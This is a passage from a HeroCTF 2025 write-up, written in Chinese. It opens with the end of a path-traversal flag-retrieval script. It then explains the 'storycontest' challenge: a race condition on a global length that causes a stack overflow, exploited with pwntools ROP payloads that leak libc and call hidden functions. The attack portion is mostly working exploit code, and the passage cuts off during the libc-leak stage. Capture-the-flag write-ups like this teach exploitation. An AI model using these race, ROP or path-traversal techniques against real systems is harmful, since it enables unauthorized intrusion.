</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Do systematic proc enumeration</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>systematic_proc_enumeration</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;HERO&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>result</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;Hero&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FLAG FOUND: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># It&#39;s a hex value</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../flag_</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FLAG FOUND: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Found hex value: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Try: ../../flag_</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[-] Could not find flag filename&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Additional ideas:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    1. Check if cracker process can be used to read flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    2. Look for log files that might contain the filename&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    3. Try timing-based enumeration&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    4. Check for other info disclosure vectors&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Usage: </span><span class=si>{</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s2> &lt;target_url&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Example: </span><span class=si>{</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s2> http://dyn12.heroctf.fr:12060&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span> <span class=o>=</span> <span class=n>Exploit</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=storycontest>storycontest<a hidden class=anchor aria-hidden=true href=#storycontest>#</a></h2><p>多线程，收到连接后启动<code>client_thread</code></p><p><img alt=image-20251201234403637-1764606537611-1 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251201234403637-1764606537611-1.png></p><p>是一个菜单</p><ol><li>更改全局变量<code>g_story_len</code>，并且根据<code>g_story_len</code>读取内容赋值给全局字符串<code>last_story</code></li><li>输出<code>last_story</code></li><li>输出全局变量<code>juru_gift</code>的值</li><li>如果全局变量<code>bonus_enabled</code>为1，则输出flag</li><li>退出</li></ol><p>漏洞点在<code>case 1</code>，</p><p><img alt=image-20251201234742226 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251201234742226.png></p><p>读取<code>g_story_len</code>之后有一个<code>usleep 0.5s</code>的空间来进行竞态，此时再开一个线程把<code>g_story_len</code>改为一个很大的值，就可以溢出<code>buf</code> ，是一个栈溢出的漏洞。</p><p>同时还有两个后门函数</p><ol><li><p><code>gift</code></p><p><img alt=image-20251201234953505 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251201234953505.png></p></li><li><p><code>bonus_entry</code></p><p><img alt=image-20251201235006659 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251201235006659.png></p></li></ol><p>思路是先调用<code>gift</code>函数，将<code>jury_gift</code>修改为<code>stdout</code>，然后通过<code>case 3</code>泄露libc</p><p>再调用<code>bonus_entry</code>函数，并且<code>rdi</code>需要是<code>322420958</code>，即<code>0x1337C0DE</code>，修改<code>bonus_enabled</code>为1，通过<code>case 4</code>获取flag</p><p><code>gift</code>函数和<code>bonus_entry</code>函数都是正常无法调用的，通过前面的栈溢出漏洞调用即可。</p><p>流程如下</p><ol><li>开一个主线程A，线程B，C，线程B选择<code>case 1</code>，线程C修改<code>g_story_len</code>，线程B栈溢出覆盖返回地址为<code>gift</code>，主线程A选择<code>case 3</code>泄露libc</li><li>由于<code>1</code>泄露了libc，所以接下来就有了<code>pop rdi; ret</code>的<code>gadgets</code>，可以控制<code>rdi</code>。再开线程D，E，线程D选择<code>case 1</code>，线程D修改<code>g_story_len</code>，线程D栈溢出进行<code>ROP</code>，使得<code>bonus_enabled</code>为1</li><li>主线程A选择<code>case 4</code>输出<code>flag</code>即可。</li></ol><p>坑点</p><ol><li>如果一个线程崩了（比如<code>ret</code>到了非法地址），整个程序也就崩了，我们得调用<code>pthread_exit()</code>来合法终止进行<code>ROP</code>的线程</li><li><code>call pthread_exit()</code>时候的<code>RBP</code>需要是合法地址，否则还会崩（因为后面栈帧会恢复到这个时候并且进行一些操作）</li><li>调用<code>pthread_exit()</code>时<code>RSP</code>需要<code>0x10</code>对齐</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>StoryContest PWN Exploit
</span></span></span><span class=line><span class=cl><span class=s2>=========================
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Exploit strategy:
</span></span></span><span class=line><span class=cl><span class=s2>1. Keep main connection alive
</span></span></span><span class=line><span class=cl><span class=s2>2. Thread 2: Race condition overflow → call gift() → leak libc via stdout
</span></span></span><span class=line><span class=cl><span class=s2>3. Main thread: Call show_jury_info() to get leaked address
</span></span></span><span class=line><span class=cl><span class=s2>4. Thread 3: Race condition overflow → ROP to bonus_entry(0x1337C0DE)
</span></span></span><span class=line><span class=cl><span class=s2>5. Main thread: Call show_public_results() → get flag
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Author: AI PWN Master
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Configuration</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=n>BINARY</span> <span class=o>=</span> <span class=s1>&#39;./storycontest_patched&#39;</span>
</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s1>&#39;dyn14.heroctf.fr&#39;</span>  <span class=c1># Change to remote host</span>
</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>14369</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Addresses (No PIE, fixed)</span>
</span></span><span class=line><span class=cl><span class=n>GIFT_ADDR</span> <span class=o>=</span> <span class=mh>0x401715</span>
</span></span><span class=line><span class=cl><span class=n>BONUS_ENTRY_ADDR</span> <span class=o>=</span> <span class=mh>0x4015fc</span>
</span></span><span class=line><span class=cl><span class=n>MAGIC_VALUE</span> <span class=o>=</span> <span class=mh>0x1337C0DE</span>
</span></span><span class=line><span class=cl><span class=n>MAIN_ADDR</span> <span class=o>=</span> <span class=mh>0x401C8A</span>
</span></span><span class=line><span class=cl><span class=n>RET</span> <span class=o>=</span> <span class=mh>0x000000000040101a</span>
</span></span><span class=line><span class=cl><span class=c1># Libc configuration</span>
</span></span><span class=line><span class=cl><span class=n>LIBC_PATH</span> <span class=o>=</span> <span class=s1>&#39;./libc.so.6&#39;</span>  <span class=c1># Adjust if needed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Gadgets (found by find_gadgets.py)</span>
</span></span><span class=line><span class=cl><span class=n>LIBC_POP_RDI_OFFSET</span> <span class=o>=</span> <span class=mh>0x000000000010f78b</span>    <span class=c1># pop rdi; ret</span>
</span></span><span class=line><span class=cl><span class=n>LIBC_STDOUT_OFFSET</span> <span class=o>=</span> <span class=mh>0x2045c0</span>     <span class=c1># stdout symbol</span>
</span></span><span class=line><span class=cl><span class=n>LIBC_SYSTEM_OFFSET</span> <span class=o>=</span> <span class=mh>0x58750</span>      <span class=c1># system() (if needed)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exploit parameters</span>
</span></span><span class=line><span class=cl><span class=n>BUF_OFFSET</span> <span class=o>=</span> <span class=mi>168</span>  <span class=c1># buf to return address: 0xA0 + 8</span>
</span></span><span class=line><span class=cl><span class=n>RACE_SLEEP</span> <span class=o>=</span> <span class=mf>0.25</span>  <span class=c1># Sleep time for race condition (adjust as needed)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Context Setup</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>BINARY</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;info&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>LIBC_PATH</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>warn</span><span class=p>(</span><span class=s2>&#34;Libc not found, will try to leak and use&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Helper Functions</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect_to_server</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Establish connection to the server&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># For local testing</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_menu_choice</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=n>choice</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Send menu choice&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>choice</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>race_condition_overflow</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>conn</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Trigger race condition to overflow buffer
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Strategy:
</span></span></span><span class=line><span class=cl><span class=s2>    1. Send legit length (128) to pass check
</span></span></span><span class=line><span class=cl><span class=s2>    2. Another thread modifies global g_story_len
</span></span></span><span class=line><span class=cl><span class=s2>    3. usleep(500ms) window for race
</span></span></span><span class=line><span class=cl><span class=s2>    4. read() uses modified g_story_len → overflow
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>conn</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>connect_to_server</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Menu choice 1: Submit a story</span>
</span></span><span class=line><span class=cl>        <span class=n>send_menu_choice</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Send legit length</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;story:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;128&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Send overflow payload</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Now type your story:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#conn.interactive()</span>
</span></span><span class=line><span class=cl>        <span class=c1># Wait for response</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Race condition exploit failed: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>race_modifier_thread</span><span class=p>(</span><span class=n>target_len</span><span class=o>=</span><span class=mi>10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Helper thread to modify global g_story_len
</span></span></span><span class=line><span class=cl><span class=s2>    This creates the TOCTOU race condition
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=n>connect_to_server</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>send_menu_choice</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;story:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>target_len</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=c1># Don&#39;t send data, just modify the global variable</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigger_race_with_modifier</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Launch race condition with helper thread&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Start modifier thread</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>race_modifier_thread</span><span class=p>,</span> <span class=n>daemon</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1>#pause()</span>
</span></span><span class=line><span class=cl>    <span class=n>race_condition_overflow</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Stages</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>stage1_leak_libc</span><span class=p>(</span><span class=n>main_conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Stage 1: Leak libc address via gift() function
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Returns: libc base address
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;STAGE 1: Leaking libc via gift()&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Build payload to call gift()</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=n>BUF_OFFSET</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>RET</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>GIFT_ADDR</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Payload length: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Target: gift() @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>GIFT_ADDR</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Trigger race condition to call gift()</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Triggering race condition to call gift()...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>trigger_race_with_modifier</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Wait for gift() to execute</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#main_conn.interactive()</span>
</span></span><span class=line><span class=cl>    <span class=c1># Use main connection to leak the address</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Calling show_jury_info() to leak jury_gift...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send_menu_choice</span><span class=p>(</span><span class=n>main_conn</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>  <span class=c1># Show jury info</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Parse response</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>main_conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=== StoryJury ===&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Response:</span><span class=se>\n</span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Extract leaked address</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;Jury gift:&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>leak_line</span> <span class=o>=</span> <span class=p>[</span><span class=n>l</span> <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;Jury gift:&#39;</span> <span class=ow>in</span> <span class=n>l</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>leak_str</span> <span class=o>=</span> <span class=n>leak_line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;:&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>leaked_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak_str</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Leaked address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leaked_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Calculate libc base</span>
</span></span><span class=line><span class=cl>        <span class=n>libc_base</span> <span class=o>=</span> <span class=n>leaked_addr</span> <span class=o>-</span> <span class=n>LIBC_STDOUT_OFFSET</span>
</span></span><span class=line><span class=cl>        <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Libc base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Verify if possible</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>libc</span> <span class=ow>and</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;stdout&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>expected_base</span> <span class=o>=</span> <span class=n>leaked_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;stdout&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>expected_base</span> <span class=o>==</span> <span class=n>libc_base</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>success</span><span class=p>(</span><span class=s2>&#34;Libc base calculation verified!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>warn</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Mismatch: expected </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>expected_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>libc_base</span>
